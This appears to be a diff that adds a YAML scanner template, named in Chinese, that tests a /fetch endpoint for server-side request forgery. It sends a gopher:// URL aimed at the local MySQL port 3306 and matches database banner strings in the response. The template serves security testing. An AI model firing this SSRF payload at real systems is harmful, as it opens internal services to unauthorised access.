@@ -1,0 +1,24 @@
+name: 服务器端请求伪造(SSRF)高级测试
+description: 测试高级服务器端请求伪造漏洞
+level: 高
+author: Test
+request:
+  method: GET
+  path: /fetch
+  params:
+    url: "gopher://127.0.0.1:3306/_INFO"
+    type: "data"
+  headers:
+    User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+    Accept: "application/json,text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
+response:
+  matchType: contains
+  successIndicators:
+    - "5.5.5-10.1.4-MariaDB"
+    - "mysql"
+    - "database"
+  errorIndicators:
+    - "invalid URL"
+    - "access denied"
+    - "无效URL"
+  statusCode: 200
